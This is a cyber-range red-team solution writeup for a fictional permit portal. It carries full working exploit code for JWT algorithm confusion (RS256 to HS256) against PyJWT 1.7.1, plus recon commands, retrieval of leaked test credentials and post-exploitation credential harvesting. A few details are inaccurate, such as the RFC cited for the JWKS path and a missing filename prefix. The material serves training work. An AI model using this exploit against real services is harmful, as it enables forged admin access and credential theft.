# solve_red.md — M1 · ext-permit-portal
## Red Team Solution Writeup
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Machine:** M1 — RPAL Exploration Permit Portal
**Vulnerability:** JWT Algorithm Confusion Attack (RS256 → HS256)
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
**MITRE ATT&CK:** T1550.001 (Use Alternate Authentication Material: Token Impersonation)
**Severity:** Critical — grants arbitrary role claims including admin
**Operator:** Varuna-2 (NEEL TRISHUL Web Application Specialist)

---

## Overview — What, Why, and How

### What is this vulnerability?

JWT (JSON Web Token) authentication supports multiple signing algorithms. The RS256 algorithm uses RSA asymmetric cryptography — the server signs tokens with its **private** key and verifies them with the **public** key. The HS256 algorithm uses HMAC-SHA256 with a **shared symmetric secret**.

The algorithm confusion attack (also called the algorithm substitution attack) works as follows:

When a JWT library verifies a token, it must know which algorithm to use. In a well-implemented library, the algorithm is fixed server-side and the `alg` field in the token header is ignored or validated against a whitelist of exactly one algorithm. In **PyJWT 1.7.1** (and many other older implementations), the library **trusts the `alg` field in the token header** when the algorithm is in the permitted list.

The attack chain:

```
1. Server uses RS256 for signing:
   verify(token, public_key_pem, algorithms=['RS256', 'HS256'])

2. Attacker observes: JWKS endpoint exposes RSA public key (standard practice)

3. Attacker realises: if they create a token with alg=HS256 and sign it using
   the RSA public key bytes as the HMAC-SHA256 secret, the server will:
   a. Read alg=HS256 from token header
   b. Use public_key_pem as the HMAC key (same bytes it uses for RSA verification)
   c. Verify the HMAC — it matches because attacker used the same bytes
   d. Accept the token as valid — with whatever claims the attacker chose

4. Result: arbitrary role claims (admin, permit-officer, etc.)
```

### Why does this vulnerability exist here?

Vikram Nair's team integrated the DGH OIDC federation in 48 hours. The JWKS endpoint is correct — exposing the RSA public key is standard and required for OIDC. The mistake is the PyJWT version and the `algorithms` parameter. PyJWT 1.7.1 was already in the server's Python environment from an older dependency, and the developer added HS256 to the algorithms list "for future flexibility in supporting simpler internal service-to-service tokens." The security implications of accepting both algorithms with the same key material were not understood.

The vulnerability was disclosed in PyJWT's changelog (version 2.4.0 added algorithm type validation) but Vikram's team never upgraded.

---

## Prerequisites

- Network access to `203.x.x.x:8443` (the permit portal)
- Tools: `curl`, `python3` with `cryptography` library, `nmap`
- No credentials required at the start — credentials are discovered during recon

---

## Phase 1 — Reconnaissance

### 1.1 — Port Scan and Service Fingerprinting

```bash
# Full port scan of the target
nmap -sV -p- 203.x.x.x --min-rate=2000 -T4

# Note all open ports — the machine runs several services
# Key ones for this challenge: :8443 (permit portal), :9443 (DGH registry)
```

```bash
# Fingerprint the permit portal
curl -si http://203.x.x.x:8443/ | head -25
# Note: Python/Flask backend, standard RPAL portal
```

### 1.2 — Credential Discovery via DGH Registry (Port 9443)

The DGH Block Licensing Registry on port 9443 has a path traversal vulnerability
in its document download endpoint. This is the intended credential discovery path.

```bash
# Confirm the registry is running
curl -s http://203.x.x.x:9443/ | grep -i "DGH\|registry\|document"
```

The "Download" links on the registry page use a `?doc=` parameter with no path
sanitisation. But first — always view the page source:

```bash
# View source of the DGH Registry page — look for developer comments
curl -s http://203.x.x.x:9443/ | grep -i "todo\|fixme\|remove\|delete\|note"
```

**Expected — HTML comment in page source:**
```html
<!-- TODO(arjun.mehta): DEVOPS-1089 — remove dev-notes.txt from docs dir before DGH go-live. Flagged in sprint review 2024-11-08. -->
```

This comment reveals the filename directly. Developers routinely leave TODO comments
in HTML source referencing pending cleanup tasks — always check source during recon.

Now retrieve the file using the path traversal endpoint:

```bash
curl -s "http://203.x.x.x:9443/registry/download?doc=dev-notes.txt"
```

**Note:** `dev-notes.txt` is also in SecLists `raft-medium-words.txt` so it would be
found by directory bruteforce as a secondary discovery path:
```bash
ffuf -u "http://203.x.x.x:9443/registry/download?doc=FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -mc 200 -t 40
```

**Discovery:** `dev-notes.txt` returns:

```
RPAL Exploration Portal — DGH Demo Environment Setup Notes
Author: arjun.mehta@rpal.in | Created: 2024-10-14 | Status: PENDING CLEANUP

Test contractor accounts for DGH integration demonstration (DEVOPS-1089):
  Portal URL : http://permit.rpal.in:8443/
  Account 1  : contractor.01 / Contractor@2024!   (Gulf Drilling Solutions)
  Account 2  : contractor.02 / Gulf@Drilling#24!  (Mahindra Energy)

NOTE: Jira DEVOPS-1089 — these test credentials must be rotated before
production go-live. Arjun to confirm with DGH team by 2024-11-30.
```

**Why this is realistic:** Developers routinely leave onboarding notes in shared
document repositories with test credentials, planning to "clean up later."
The filename prefix `_` indicates a scratch/temp file that was never removed.

### 1.3 — Login and Obtain a Legitimate Token

With credentials from the dev notes, login to the permit portal:

```bash
curl -s -X POST http://203.x.x.x:8443/login \
     -d "username=contractor.01&password=Contractor@2024!" \
     -c /tmp/cookies.txt -b /tmp/cookies.txt \
     -D /tmp/headers.txt > /dev/null

# Extract token from cookies file
TOKEN=$(grep rpal_token /tmp/cookies.txt | awk '{print $NF}')
echo "Token: ${TOKEN:0:60}..."
```

**Decode the JWT header — this reveals the algorithm and kid:**

```bash
echo "$TOKEN" | cut -d. -f1 |   python3 -c "import sys,base64,json;   d=sys.stdin.read().strip();   d+='='*(4-len(d)%4);   print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))"
```

**Expected header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "rpal-permit-2024-v1"
}
```

**Decode the payload — note the `role` claim:**

```bash
echo "$TOKEN" | cut -d. -f2 |   python3 -c "import sys,base64,json;   d=sys.stdin.read().strip();   d+='='*(4-len(d)%4);   print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))"
```

```json
{
  "iss": "https://permit.rpal.in",
  "sub": "contractor.01",
  "role": "applicant",
  "iat": 1731638400,
  "exp": 1731667200
}
```

**Key observations:**
1. Algorithm is `RS256` — asymmetric, signed with RSA private key
2. `kid: rpal-permit-2024-v1` — hints at a key identifier, likely in a JWKS endpoint
3. `role: applicant` — there must be higher-privilege roles (admin, permit-officer)

### 1.4 — JWKS Endpoint Discovery

The JWT header contains `kid` which is a convention from RFC 7517 (JSON Web Key Sets).
This strongly indicates a JWKS endpoint. Try the standard well-known path:

```bash
# Standard OIDC/JWKS well-known path — try it directly
curl -s http://203.x.x.x:8443/.well-known/jwks.json | python3 -m json.tool
```

**Expected response:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "rpal-permit-2024-v1",
      "alg": "RS256",
      "n": "sNxq8V4nf...long base64url string...",
      "e": "AQAB"
    }
  ]
}
```

**Why `/.well-known/jwks.json` is the right path to try:**
The `kid` field in a JWT header is defined in the JOSE (JSON Object Signing and
Encryption) standard. Any service using RSA JWT signing that exposes a JWKS
endpoint uses `/.well-known/jwks.json` as the canonical path (RFC 8414). Tools
like `ffuf` with a well-known path wordlist will also find this:

```bash
ffuf -u http://203.x.x.x:8443/.well-known/FUZZ      -w /usr/share/wordlists/SecLists/Discovery/Web-Content/well-known.txt      -mc 200
```

**Why this matters:**
The `n` and `e` values are the RSA public key's modulus and exponent in base64url
encoding. This is the server's RSA public key — the same bytes that the vulnerable
`verify_token()` function uses as the HMAC secret when processing HS256 tokens.

**Decode the JWT to understand structure:**
```bash
TOKEN="eyJ..."   # paste the token here

# Decode header (without verification)
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
```

**Expected header:**
```json
{
  "alg": "RS256",
  "kid": "rpal-permit-2024-v1",
  "typ": "JWT"
}
```

**Decode payload:**
```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**Expected payload:**
```json
{
  "iss": "https://permit.rpal.in",
  "sub": "contractor.01",
  "role": "applicant",
  "iat": 1731638400,
  "exp": 1731667200,
  "jti": "abc123..."
}
```

**Why this matters:**
Now you know the exact claim structure. To forge an admin token, you need:
- `"alg": "HS256"` in header (changed from RS256)
- `"role": "admin"` in payload (escalated)
- Valid HMAC-SHA256 signature using the RSA public key bytes as secret

---

## Phase 2 — Vulnerability Analysis

### 2.1 — Understanding What the Server Does with the Public Key

The vulnerable code in `app.py`:
```python
decoded = jwt.decode(
    token,
    PUBLIC_KEY_PEM,           # This is the RSA public key in PEM format
    algorithms=['RS256', 'HS256'],   # Both algorithms accepted
)
```

When PyJWT 1.7.1 processes a token with `alg: HS256`:
1. It reads `alg: HS256` from the token header
2. It sees HS256 is in the `algorithms` list → proceeds
3. It uses `PUBLIC_KEY_PEM` (the bytes) as the HMAC-SHA256 key
4. It computes HMAC-SHA256 of `header.payload` using those bytes
5. It compares against the token's signature field

**The attack:** Sign a token with HMAC-SHA256 using the RSA public key PEM bytes as the secret. The PEM file content (starting with `-----BEGIN PUBLIC KEY-----`) is used verbatim as the HMAC key bytes.

### 2.2 — Extracting the RSA Public Key from JWK Format

The JWKS endpoint gives you `n` and `e` as base64url integers. You need the PEM-encoded public key. Here is the conversion:

```python
import base64, json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

jwks_raw = '{"keys":[{"kty":"RSA","use":"sig","kid":"rpal-permit-2024-v1","alg":"RS256","n":"...","e":"AQAB"}]}'
jwks = json.loads(jwks_raw)
key_data = jwks['keys'][0]

def b64url_to_int(s):
    # Add padding if needed
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

n = b64url_to_int(key_data['n'])
e = b64url_to_int(key_data['e'])

# Reconstruct RSA public key from modulus and exponent
public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())

# Export as PEM
pem = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
# Outputs:
# -----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhki...
# -----END PUBLIC KEY-----
```

---

## Phase 3 — Exploitation

### 3.1 — Complete Exploit Script

Save this as `/tmp/jwt_confusion_exploit.py`:

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Exploit — M1 RPAL Permit Portal
Target: http://203.x.x.x:8443
Vulnerability: PyJWT 1.7.1 trusts alg header — RS256 public key used as HS256 secret
"""

import requests, json, base64, sys
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import jwt   # must be pyjwt==1.7.1 on attacker machine for signing; OR use hmac manually
import hmac, hashlib, datetime

TARGET = "http://203.x.x.x:8443"  # change to actual IP

# ── Step 1: Fetch JWKS and extract RSA public key ────────────────────────────
print("[*] Fetching JWKS endpoint...")
jwks_resp = requests.get(f"{TARGET}/.well-known/jwks.json")
jwks_resp.raise_for_status()
jwks = jwks_resp.json()
key_data = jwks['keys'][0]
print(f"[+] Found key: kid={key_data['kid']}, alg={key_data['alg']}")

# ── Step 2: Convert JWK to PEM ───────────────────────────────────────────────
def b64url_to_int(s):
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

n = b64url_to_int(key_data['n'])
e = b64url_to_int(key_data['e'])
public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
PUBLIC_KEY_PEM = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(f"[+] RSA public key extracted ({len(PUBLIC_KEY_PEM)} bytes)")
print(PUBLIC_KEY_PEM.decode())

# ── Step 3: Forge admin JWT using HS256 with public key as secret ────────────
# The public key PEM bytes ARE the HMAC secret from the server's perspective.
#
# We build the JWT manually to avoid local PyJWT version confusion:
#   header.payload.signature
# where signature = HMAC-SHA256(header + "." + payload, PUBLIC_KEY_PEM)

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = datetime.datetime.utcnow()
exp = now + datetime.timedelta(hours=8)

header = {
    "alg": "HS256",          # <-- Changed from RS256
    "kid": key_data['kid'],  # Keep the same kid to look legitimate
    "typ": "JWT"
}

payload = {
    "iss": "https://permit.rpal.in",
    "sub": "admin",          # <-- arbitrary subject
    "role": "admin",         # <-- escalated role
    "iat": int(now.timestamp()),
    "exp": int(exp.timestamp()),
    "jti": base64.urlsafe_b64encode(b"exploit-token-ds01").rstrip(b'=').decode()
}

header_enc  = b64url_encode(json.dumps(header,  separators=(',', ':')))
payload_enc = b64url_encode(json.dumps(payload, separators=(',', ':')))
signing_input = f"{header_enc}.{payload_enc}".encode()

# HMAC-SHA256 with the RSA public key PEM bytes as secret
signature = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
sig_enc = b64url_encode(signature)

forged_token = f"{header_enc}.{payload_enc}.{sig_enc}"
print(f"\n[+] Forged JWT (HS256, role=admin):")
print(forged_token[:80] + "...")

# ── Step 4: Test forged token against admin endpoint ────────────────────────
print("\n[*] Testing forged token against /api/v1/admin/system-config...")
resp = requests.get(
    f"{TARGET}/api/v1/admin/system-config",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(f"[*] Response status: {resp.status_code}")

if resp.status_code == 200:
    data = resp.json()
    print("\n[+] SUCCESS — Admin API accessible with forged token!")
    print("\n[+] System Configuration (credential exfiltration):")
    for entry in data.get('config', []):
        print(f"    {entry['key']:40s} = {entry['value']}")
else:
    print(f"[-] Failed: {resp.text[:200]}")
    sys.exit(1)

# ── Step 5: Extract credentials for M2 ─────────────────────────────────────
print("\n[+] Pivot credentials for M2 (GraphQL API):")
config = {e['key']: e['value'] for e in data.get('config', [])}
print(f"    GraphQL Endpoint: {config.get('graphql_api_endpoint', 'N/A')}")
print(f"    Service User:     {config.get('graphql_service_user', 'N/A')}")
print(f"    Service Password: {config.get('graphql_service_pass', 'N/A')}")
print(f"    API Key:          {config.get('graphql_api_key', 'N/A')}")
print("\n[+] Exploitation complete. Proceed to M2.")
```

**Run the exploit:**
```bash
python3 /tmp/jwt_confusion_exploit.py
```

### 3.2 — Manual JWT Construction (No Python Required)

If you prefer command-line tools:

```bash
# Step 1: Get RSA public key as PEM from JWKS
# (Use the Python snippet from Phase 2 to get the PEM)
# Save to /tmp/rpal_pub.pem

# Step 2: Build JWT manually
HEADER=$(echo -n '{"alg":"HS256","kid":"rpal-permit-2024-v1","typ":"JWT"}' | \
         base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n')

PAYLOAD=$(echo -n "{\"iss\":\"https://permit.rpal.in\",\"sub\":\"admin\",\"role\":\"admin\",\"iat\":$(date +%s),\"exp\":$(($(date +%s)+28800)),\"jti\":\"atk-ds01\"}" | \
          base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n')

SIGNING="${HEADER}.${PAYLOAD}"

# HMAC-SHA256 with PEM bytes as secret
SIG=$(echo -n "$SIGNING" | \
      openssl dgst -sha256 -hmac "$(cat /tmp/rpal_pub.pem)" -binary | \
      base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n')

TOKEN="${SIGNING}.${SIG}"

# Step 3: Test against admin API
curl -s http://203.x.x.x:8443/api/v1/admin/system-config \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Note:** The `openssl dgst -hmac` approach passes the secret as a string. You need the PEM bytes — `cat /tmp/rpal_pub.pem` provides the file content including the `-----BEGIN/END-----` lines, which is exactly what PyJWT 1.7.1 uses as the HMAC key. This is correct.

---

## Phase 4 — Post-Exploitation

### 4.1 — Extract Full System Configuration

```bash
curl -s http://203.x.x.x:8443/api/v1/admin/system-config \
     -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for e in data['config']:
    print(f'{e[\"key\"]}: {e[\"value\"]}')
"
```

**Key credentials extracted:**

| Key | Value | Purpose |
|---|---|---|
| `graphql_api_endpoint` | `http://203.x.x.x:4000/graphql` | M2 GraphQL API endpoint |
| `graphql_service_user` | `rpal-explore-svc` | M2 service account |
| `graphql_service_pass` | `T@riff@Expl0re!24` | M2 service account password |
| `graphql_api_key` | `RPAL-API-2024-XK9mP3nT8qRs` | M2 API key |
| `upstream_soap_endpoint` | `http://203.x.x.x:8080/TariffGateway` | M3 SOAP gateway endpoint |

### 4.2 — Enumerate All Users

```bash
curl -s http://203.x.x.x:8443/api/v1/admin/users \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### 4.3 — Use Forged Token for Portal Access

```bash
# Set cookie and browse the admin dashboard
curl -s http://203.x.x.x:8443/dashboard \
     -b "rpal_token=${TOKEN}" | grep -i admin
```

---

## Pitfalls and Common Mistakes

### Pitfall 1 — Using a Newer PyJWT Version Locally

If your local attacker machine has PyJWT >= 2.4.0, `jwt.encode()` with `HS256` will refuse to use an RSA public key as the secret. **Build the JWT manually using `hmac.new()`** (as shown in the exploit script above) rather than relying on PyJWT for signing.

### Pitfall 2 — Wrong Key Format

The HMAC secret must be the exact bytes of the PEM file — including the `-----BEGIN PUBLIC KEY-----` header, newlines, base64 content, and `-----END PUBLIC KEY-----` trailer. Do not strip or modify the PEM. The server reads the raw file bytes.

```python
# Correct — full PEM bytes
with open('/tmp/rpal_pub.pem', 'rb') as f:
    SECRET = f.read()

# WRONG — this won't match
SECRET = "MIIBIjANBgkqhki..."   # just the base64 content
```

### Pitfall 3 — Expired Token

The `exp` claim must be in the future. The server validates token expiry even after the algorithm confusion bypass succeeds. Set `exp` to at least 1 hour from now.

### Pitfall 4 — Trying Standard Tools First

Tools like `jwt_tool`, `jwt-hack`, or OWASP ZAP JWT scanner will detect the JWKS endpoint and suggest algorithm confusion but may not correctly handle the PEM-as-HMAC-bytes step. Understand the manual process before relying on automated tools.

### Pitfall 5 — The Admin Portal is API-Only

There is no admin UI page at `/admin`. The admin functionality is exposed via REST API at `/api/v1/admin/*`. Use `curl` with the `Authorization` header, not the browser with the cookie (which works too, but the API returns JSON not HTML).

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-technique | ID |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | — | T1190 |
| Credential Access | Use Alternate Authentication Material | Token Impersonation | T1550.001 |
| Discovery | Account Discovery | — | T1087 |
| Collection | Data from Information Repositories | — | T1213 |

---

*solve_red.md | M1 ext-permit-portal | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
